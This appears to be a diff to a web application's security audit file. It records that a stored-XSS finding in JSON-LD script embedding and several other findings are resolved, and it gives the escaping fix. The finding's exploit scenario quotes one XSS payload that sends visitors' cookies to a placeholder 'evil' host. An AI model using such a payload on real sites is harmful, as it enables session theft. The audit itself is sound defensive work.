@@ -157,6 +157,10 @@ The newer auth/portal API surface (Better Auth + middleware + portal routes) has
 - **Description:** Pattern `<script type="application/ld+json" set:html={JSON.stringify(pageGraph)} />` interpolates Sanity-authored fields (sponsor name/description, article headline/excerpt, author name/bio, breadcrumb labels, siteSettings.siteName) into an inline script. `JSON.stringify` does **not** escape `<`, `>`, or `/`, so the substring `</script>` placed inside any field terminates the inline script tag at parse time and what follows is interpreted as HTML. CSP at `layouts/Layout.astro:84` is `script-src 'self' 'unsafe-inline'` (no nonce), so injected inline scripts execute.
 - **Exploit Scenario:** A Sanity editor (intentional, social-engineered, or via stolen credentials) sets sponsor `name` to `Acme</script><script>fetch('//evil/'+document.cookie)</script>`. Every visitor's browser exfiltrates auth/session cookies (incl. portal Better-Auth session for any logged-in sponsor or admin viewing the page).
 - **Fix:** Escape JSON for safe inline embedding before injection: `JSON.stringify(graph).replace(/</g,'\\u003c').replace(/>/g,'\\u003e').replace(/&/g,'\\u0026').replace(/ /g,'\\u2028').replace(/ /g,'\\u2029')`. Best implemented as a single `<JsonLd schema={...} />` component used everywhere. Even better: drop `'unsafe-inline'`, adopt nonces (Astro 5+ experimental CSP feature).
+- **Status: RESOLVED 2026-05-05 via Story 24.5.**
+  - `JsonLd.astro` escapes `<`, `>`, `&`, U+2028, U+2029 once after `JSON.stringify` (per the "Fix" recipe above, factored into a single `escapeForInlineScript()` helper).
+  - All 16 inline `<script type="application/ld+json" set:html={...}>` callsites (14 pages + Layout fallback + the component itself) migrated to `<JsonLd schema={pageGraph} slot="structured-data" />`. Build-output grep over `astro-app/src/pages` + `astro-app/src/layouts` returns zero matches.
+  - CSP nonce adoption (drop `'unsafe-inline'`) filed as follow-up TODO in Story 24.5 PR Summary; not blocked by anything but out of scope for this story.
 
 ### M-8: Stored XSS via Sanity-authored `EmbedBlock.rawEmbedCode`
 - **Files:** `astro-app/src/components/blocks/custom/EmbedBlock.astro:38, 75, 112`; schema `studio/src/schemaTypes/blocks/embed-block.ts:32`
@@ -210,7 +214,7 @@ All routes gated by middleware (session + role + sponsor whitelist + agreement a
 1. [x] **H-1** — rotate `STUDIO_ADMIN_TOKEN`; refactor `SponsorAcceptancesTool` to authenticate via Studio user identity rather than a shared bearer. (Highest blast radius, simplest fix.) **RESOLVED 2026-05-01 via Story 24.1.**
 2. [x] **H-3** — set `disableSignUp: true` on magic link, `allowDifferentEmails: false` on account linking. One-line config changes. **RESOLVED 2026-05-05 via Story 24.2.**
 3. **M-1, M-2** — add unsubscribe token + double-opt-in to `/api/subscribe`. New random column + email flow.
-4. **M-7, M-8** — introduce `<JsonLd>` component with proper escaping; sandbox or DOMPurify the `EmbedBlock`.
+4. [x] **M-7, M-8** — introduce `<JsonLd>` component with proper escaping; sandbox or DOMPurify the `EmbedBlock`. **RESOLVED 2026-05-05 via Story 24.5 (M-7) + Story 24.6 (M-8).**
 5. **H-2** — switch `SESSION_CACHE` to hashed keys + stored `expiresAt`, or remove and rely on Better Auth `cookieCache`.
 6. [x] **M-3** — replace request-reflective `trustedOrigins`/`baseURL` with `CLOUDFLARE_ENV`-driven static allowlist. **RESOLVED 2026-05-05 via Story 24.2.**
 7. [x] **M-4** — restrict who can edit `sponsor.allowedEmails` in Studio. **RESOLVED 2026-05-05 via Story 24.7.**
